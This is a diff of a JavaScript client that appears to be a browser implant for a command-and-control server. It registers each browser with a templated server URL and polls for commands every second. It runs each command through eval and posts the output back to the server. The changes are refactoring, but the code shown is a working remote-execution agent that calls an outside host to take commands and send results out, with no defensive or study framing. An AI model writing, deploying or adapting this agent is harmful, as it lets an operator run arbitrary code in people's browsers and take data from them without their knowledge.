@@ -5,6 +5,7 @@
 
     /* Eval Context */
     this.context = {};
+    this.url = config.url + ':' + config.port;
 
     /* Logging functions */
     this.log = function (text) {
@@ -24,20 +25,22 @@
 
     /* register as a new client */
     this.register = function () {
+
         var formData = {
-            'uuid': getUUID(),
+            'uuid': this.getUUID(),
             'user_agent' : navigator.userAgent
-        };
+            };
 
         $.ajax({
-            url: config.url + ':' + config.port + '/register/',
+            url: this.url + '/register',
             type: "POST",
             data: formData,
+            context: this,
             success: function (data, textStatus, jqXHR) {
-                log(data);
+                this.log(data);
             },
             error: function (jqXHR, textStatus, errorThrown) {
-                err(textStatus);
+                this.err(textStatus);
             }
         });
 
@@ -48,7 +51,7 @@
     this.getCommand = function() {
 
         $.ajax({
-            url: config.url + ':' + config.port + '/get_command/' + this.id,
+            url: this.url + '/get_command/' + this.id,
             type: "GET",
             dataType: 'json',
             context: this,
@@ -59,42 +62,45 @@
                     var cmd_id = data['cmd_id'];
                     this.exec(cmd, cmd_id);
                 }
-                log(data);
+
+                this.log(data);
             },
             error: function (jqXHR, textStatus, errorThrown) {
-                err(textStatus);
+                this.err(textStatus);
             }
         })
     };
 
     /* executes a command in the eval context */
     this.exec = function(cmd, cmd_id) {
-        try
-        {
+        try {
+
             var out = eval.call(this.context, cmd);
+            // var out = this.evalInContext(cmd,this.context);
+
             var js = JSON.prune(out);
 
-            //var out = JSON.stringify(eval(cmd));
             this.postBack({'output' : js, 'cmd_id' : cmd_id, 'uuid' : this.id});
         }
-        catch(err)
-        {
+        catch(err) {
             this.postBack({'output' : err.message, 'cmd_id' : cmd_id, 'uuid' : this.id});
         }
     };
+
 
     /* when a command has finished executing, post it back to the server */
     this.postBack = function(data) {
 
         $.ajax({
-            url: config.url + ':' + config.port + '/post_back/',
+            url: this.url + '/post_back',
             type: "POST",
             data: data,
+            context: this,
             success: function (data, textStatus, jqXHR) {
-                log(data);
+                this.log(data);
             },
             error: function (jqXHR, textStatus, errorThrown) {
-                err(errorThrown);
+                this.err(errorThrown);
             }
         });
     };
@@ -104,8 +110,7 @@
     setInterval(this.getCommand, 1000);
 
 }({
-    'debug' : true,
+    'debug' : {{ debug }},
     'url' : '{{ url }}',
     'port' : '{{ port }}'
 });
-
